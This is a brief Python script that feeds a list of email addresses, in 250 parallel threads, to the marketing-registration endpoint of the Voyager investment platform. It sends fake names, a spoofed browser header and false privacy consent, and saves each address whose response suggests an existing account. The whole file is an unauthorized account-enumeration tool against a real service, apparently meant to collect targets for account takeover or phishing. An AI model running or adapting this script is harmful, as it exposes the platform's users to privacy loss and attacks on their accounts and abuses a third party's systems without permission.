from httpx import Client
from concurrent.futures import ThreadPoolExecutor
import urllib
emails = open("emails.txt", 'r', errors='ignore').read().splitlines()
valid = open("valid_voyager.txt", 'a+', errors='ignore')
def request(email):
    try:
        session = Client()
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"}
        data = {
            "user":{
                "email": email, 
                "firstname": "gaming",
                "lastname": "man",
                "state": "CT",
                "country": "US"
            },
            "consent": {
                "url": "https://www.investvoyager.com/",
                "text":"I consent to the Privacy Policy, to share my information, and to receive Voyager business & marketing emails."
            },
            "code": "DEFAULT_TEST"
        }
        response = session.post("https://api.investvoyager.com/api/v0/marketing/users/register", json=data, headers=headers).text
        if response != 'OK':
            valid.write(f"{email}\n")
            print(f"VALID: {email}")
    except Exception as e:
        pass
if __name__ == '__main__':
    with ThreadPoolExecutor(max_workers=250) as thread_pool:
        thread_pool.map(request, emails)
